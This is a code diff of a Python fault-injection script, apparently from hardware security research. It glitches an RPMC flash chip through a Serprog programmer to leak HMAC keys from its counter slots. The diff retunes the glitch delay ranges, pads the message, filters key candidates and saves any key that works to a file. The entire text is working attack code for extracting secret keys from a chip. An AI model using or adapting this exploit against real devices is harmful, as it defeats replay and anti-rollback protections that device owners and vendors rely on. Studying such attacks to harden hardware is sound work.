@@ -72,31 +72,31 @@ def leak_hmac_key(target_counter: int, key_data: bytes):
           f'Looking for {key.hex()}')
 
     chip = Serprog('/dev/ttyACM0', 1_000_000)
-    msg = b'\x9b\x01' + target_counter.to_bytes(1) + b'\x00' + key_data #+ b'\x42' * 32
-    msg += HMAC(key, msg, hashlib.sha256).digest()
+    msg = b'\x9b\x01' + target_counter.to_bytes(1) + b'\x00' + key_data + b'\x42' * 32
+    #<msg += HMAC(key, msg, hashlib.sha256).digest()
 
-    for glitch_cycles in range(7300, 7800):
+    for glitch_cycles in range(8600, 9000):
         for _ in range(10):
             chip.exchange(msg, 0, glitch_cycles)
             try:
+                time.sleep(0.0005)
                 rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
             except RuntimeError as e:
                 full_status = rpmc_get_status(chip)
                 signature = full_status[-32:]
-                if entropy(signature) != 0.0:
-                    print(f'Delay {glitch_cycles}: {e}')
+                print(f'Delay {glitch_cycles}: {e}')
+                if entropy(signature) != 0.0 and not signature.startswith(b'\x42' * 6):
                     pretty_print_status(full_status)
                     print(f'Key candidate {signature.hex()}')
                     try:
+                        time.sleep(0.001)
                         rpmc_update_hmac_key(chip, signature, target_counter, key_data)
                         print(f'Key {signature.hex()} works for counter {target_counter}')
                         with open(f'key_slot_{target_counter}_{key_data.hex()}.bin', 'wb') as f:
                             f.write(signature)
                             return
-                        break
                     except RuntimeError as e:
                         print(e)
-
             except TimeoutError as e:
                 print(f'Delay {glitch_cycles}: {e}')
                 full_status = rpmc_get_status(chip)
@@ -184,6 +184,6 @@ def glitch_get(target_counter: int):
 
 if __name__ == '__main__':
     #glitch_increment_counter(1)
-    leak_hmac_key(1, b'\x00\x00\x00\x00')
+    leak_hmac_key(3, b'\x01\x00\x00\x00')
     #brute_force_space(0, debug=False)
     #glitch_get(1)
